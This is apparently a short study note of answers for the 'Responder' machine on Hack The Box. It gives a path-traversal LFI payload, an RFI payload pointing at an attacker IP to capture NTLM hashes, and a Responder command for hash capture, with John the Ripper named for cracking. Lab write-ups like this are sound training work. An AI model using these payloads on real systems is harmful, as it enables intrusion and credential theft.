---
tags: [archive, hackthebox, lfi, ntlm, responder]
platform: Hack The Box
tier: "1"
status: archived
---

# Responder

- Visiting by IP redirects to domain: `unika.htb`
- Scripting language on the server: a DNS probe error appears first; adding the domain to `/etc/hosts` and switching the site to French reveals PHP is in use.
- URL parameter used to load different language versions: `page`
- Example Local File Include (LFI) payload for that parameter: `../../../../../../../../windows/system32/drivers/etc/hosts`
- Example Remote File Include (RFI) payload: `//10.10.14.6/somefile`
- NTLM stands for New Technology LAN Manager
- Responder flag to specify the network interface: `-I`
- Tool that takes an NTLMv2 challenge/response and brute-forces matching passwords: John the Ripper
- Administrator password found via: `sudo responder -I tun0` (run openly, since nothing else was intercepting on that interface)
